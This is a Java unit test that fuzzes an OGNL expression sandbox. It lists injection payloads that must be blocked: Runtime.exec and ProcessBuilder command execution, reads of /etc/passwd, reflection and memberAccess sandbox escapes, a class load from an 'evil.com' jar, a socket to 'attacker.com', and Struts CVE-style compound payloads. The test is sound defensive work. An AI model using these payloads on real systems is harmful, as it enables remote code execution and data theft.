/*
 * Copyright 2026 lucientong.
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     https://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

package com.joltvm.server.ognl;

import org.junit.jupiter.api.AfterAll;
import org.junit.jupiter.api.BeforeAll;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.ValueSource;

import java.util.Map;

import static org.junit.jupiter.api.Assertions.*;

/**
 * Security fuzz test for the OGNL expression engine.
 *
 * <p>Every test in this class must PASS (i.e., the expression must be BLOCKED).
 * If any of these expressions executes successfully, the sandbox is compromised.
 *
 * <p>Covers known OGNL injection vectors from:
 * <ul>
 *   <li>Apache Struts CVE-2017-5638, CVE-2018-11776</li>
 *   <li>Arthas OGNL attack patterns</li>
 *   <li>OWASP OGNL injection payloads</li>
 *   <li>Custom sandbox escape attempts</li>
 * </ul>
 */
class OgnlSecurityFuzzTest {

    private static OgnlService ognlService;

    @BeforeAll
    static void setUp() {
        ognlService = new OgnlService();
    }

    @AfterAll
    static void tearDown() {
        ognlService.shutdown();
    }

    /**
     * Asserts that the given expression is blocked (success=false and errorType=SECURITY
     * or the expression fails to evaluate).
     */
    private void assertBlocked(String expression) {
        Map<String, Object> result = ognlService.evaluate(expression, 3);
        assertNotNull(result, "Result should not be null for: " + expression);
        if (Boolean.TRUE.equals(result.get("success"))) {
            fail("SECURITY BREACH: Expression should have been blocked but succeeded: " + expression
                 + "\nResult: " + result.get("result"));
        }
        // success=false is correct — expression was blocked or failed
    }

    // ================================================================
    // 1. Runtime.exec() — command execution (RCE)
    // ================================================================

    @ParameterizedTest
    @ValueSource(strings = {
            "@java.lang.Runtime@getRuntime().exec('whoami')",
            "@java.lang.Runtime@getRuntime().exec(new String[]{'sh','-c','id'})",
            "(#rt=@java.lang.Runtime@getRuntime()).(#rt.exec('cat /etc/passwd'))",
            "#rt=@java.lang.Runtime@getRuntime(),#rt.exec('ls')",
            "new java.lang.ProcessBuilder({'ls'}).start()",
            "new java.lang.ProcessBuilder(new String[]{'cat','/etc/passwd'}).start()",
            "@java.lang.Runtime@getRuntime().exec('calc')",
    })
    void blocksRuntimeExec(String expression) {
        assertBlocked(expression);
    }

    // ================================================================
    // 2. System.exit() — JVM shutdown
    // ================================================================

    @ParameterizedTest
    @ValueSource(strings = {
            "@java.lang.System@exit(0)",
            "@java.lang.System@exit(1)",
            "@java.lang.Runtime@getRuntime().halt(0)",
    })
    void blocksSystemExit(String expression) {
        assertBlocked(expression);
    }

    // ================================================================
    // 3. Reflection-based sandbox escape
    // ================================================================

    @ParameterizedTest
    @ValueSource(strings = {
            // forName + getMethod + invoke chain
            "@java.lang.Class@forName('java.lang.Runtime').getMethod('exec',new Class[]{@java.lang.String@class}).invoke(@java.lang.Runtime@getRuntime(),'id')",
            // getClass().forName()
            "''.getClass().forName('java.lang.Runtime')",
            "''.getClass().forName('java.lang.Runtime').getMethod('exec',''.getClass()).invoke(null,'id')",
            // getDeclaredMethod
            "@java.lang.Runtime@class.getDeclaredMethod('exec',new Class[]{@java.lang.String@class})",
            // newInstance
            "@java.lang.Class@forName('java.lang.ProcessBuilder').newInstance(new String[]{'ls'})",
    })
    void blocksReflection(String expression) {
        assertBlocked(expression);
    }

    // ================================================================
    // 4. MemberAccess override (sandbox escape)
    // ================================================================

    @ParameterizedTest
    @ValueSource(strings = {
            "#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS",
            "#_memberAccess['allowPrivateAccess']=true",
            "(#memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#rt=@java.lang.Runtime@getRuntime()).(#rt.exec('id'))",
            "#context['memberAccess']=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS",
    })
    void blocksMemberAccessOverride(String expression) {
        assertBlocked(expression);
    }

    // ================================================================
    // 5. Unsafe memory access
    // ================================================================

    @ParameterizedTest
    @ValueSource(strings = {
            "@sun.misc.Unsafe@getUnsafe()",
            "@jdk.internal.misc.Unsafe@getUnsafe()",
    })
    void blocksUnsafe(String expression) {
        assertBlocked(expression);
    }

    // ================================================================
    // 6. File system access
    // ================================================================

    @ParameterizedTest
    @ValueSource(strings = {
            "new java.io.File('/etc/passwd').exists()",
            "new java.io.FileInputStream('/etc/passwd')",
            "new java.io.FileReader('/etc/passwd')",
            "@java.nio.file.Files@readAllLines(@java.nio.file.Paths@get('/etc/passwd'))",
            "new java.io.FileOutputStream('/tmp/evil.txt')",
    })
    void blocksFileAccess(String expression) {
        assertBlocked(expression);
    }

    // ================================================================
    // 7. Network access
    // ================================================================

    @ParameterizedTest
    @ValueSource(strings = {
            "new java.net.Socket('attacker.com',4444)",
            "new java.net.URL('http://attacker.com').openStream()",
            "new java.net.ServerSocket(4444)",
    })
    void blocksNetworkAccess(String expression) {
        assertBlocked(expression);
    }

    // ================================================================
    // 8. ClassLoader manipulation
    // ================================================================

    @ParameterizedTest
    @ValueSource(strings = {
            "new java.net.URLClassLoader(new java.net.URL[]{new java.net.URL('http://evil.com/malware.jar')})",
            "@java.lang.Thread@currentThread().getContextClassLoader()",
    })
    void blocksClassLoaderAccess(String expression) {
        assertBlocked(expression);
    }

    // ================================================================
    // 9. Scripting engine (eval arbitrary code)
    // ================================================================

    @ParameterizedTest
    @ValueSource(strings = {
            "new javax.script.ScriptEngineManager().getEngineByName('js').eval('java.lang.Runtime.getRuntime().exec(\"id\")')",
            "new javax.script.ScriptEngineManager().getEngineByName('nashorn').eval('1+1')",
    })
    void blocksScriptEngine(String expression) {
        assertBlocked(expression);
    }

    // ================================================================
    // 10. Thread manipulation
    // ================================================================

    @ParameterizedTest
    @ValueSource(strings = {
            "new java.lang.Thread(null,'evil').start()",
            "@java.lang.Thread@currentThread().getThreadGroup().destroy()",
    })
    void blocksThreadManipulation(String expression) {
        assertBlocked(expression);
    }

    // ================================================================
    // 11. Serialization attacks
    // ================================================================

    @ParameterizedTest
    @ValueSource(strings = {
            "new java.io.ObjectInputStream(new java.io.FileInputStream('/tmp/payload'))",
    })
    void blocksDeserialization(String expression) {
        assertBlocked(expression);
    }

    // ================================================================
    // 12. OGNL internal manipulation
    // ================================================================

    @ParameterizedTest
    @ValueSource(strings = {
            "@ognl.OgnlRuntime@setStaticMethodAccess(true)",
            "@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS",
    })
    void blocksOgnlInternals(String expression) {
        assertBlocked(expression);
    }

    // ================================================================
    // 13. Struts2-style compound payloads
    // ================================================================

    @ParameterizedTest
    @ValueSource(strings = {
            // CVE-2017-5638 style
            "(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd','/c','whoami'}:{'bash','-c','whoami'})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start())",
            // CVE-2018-11776 style
            "(#_memberAccess['allowPrivateAccess']=true,#_memberAccess['allowProtectedAccess']=true,#_memberAccess['allowPackageProtectedAccess']=true,#_memberAccess['allowStaticMethodAccess']=true,@java.lang.Runtime@getRuntime().exec('id'))",
    })
    void blocksStrutsStylePayloads(String expression) {
        assertBlocked(expression);
    }

    // ================================================================
    // 14. Verify safe expressions DO work
    // ================================================================

    @Test
    void allowsSimpleArithmetic() {
        Map<String, Object> result = ognlService.evaluate("1 + 2", 3);
        assertTrue((Boolean) result.get("success"));
        assertEquals(3, result.get("result"));
    }

    @Test
    void allowsStringOperations() {
        Map<String, Object> result = ognlService.evaluate("\"Hello\".toUpperCase()", 3);
        assertTrue((Boolean) result.get("success"));
        assertEquals("HELLO", result.get("result"));
    }

    @Test
    void allowsStringConcat() {
        Map<String, Object> result = ognlService.evaluate("\"foo\" + \"bar\"", 3);
        assertTrue((Boolean) result.get("success"));
        assertEquals("foobar", result.get("result"));
    }

    @Test
    void allowsRuntimeInfoAccess() {
        Map<String, Object> result = ognlService.evaluate("#runtime.availableProcessors()", 3);
        assertTrue((Boolean) result.get("success"), "Result: " + result);
        assertNotNull(result.get("result"));
    }

    @Test
    void allowsCollectionCreation() {
        Map<String, Object> result = ognlService.evaluate("{1, 2, 3}.size()", 3);
        assertTrue((Boolean) result.get("success"), "Result: " + result);
        assertEquals(3, result.get("result"));
    }

    @Test
    void rejectsBlankExpression() {
        Map<String, Object> result = ognlService.evaluate("   ", 3);
        assertFalse((Boolean) result.get("success"));
    }

    @Test
    void respectsResultDepthLimit() {
        Map<String, Object> result = ognlService.evaluate("\"test\"", 1);
        assertTrue((Boolean) result.get("success"));
        assertNotNull(result.get("result"));
    }
}
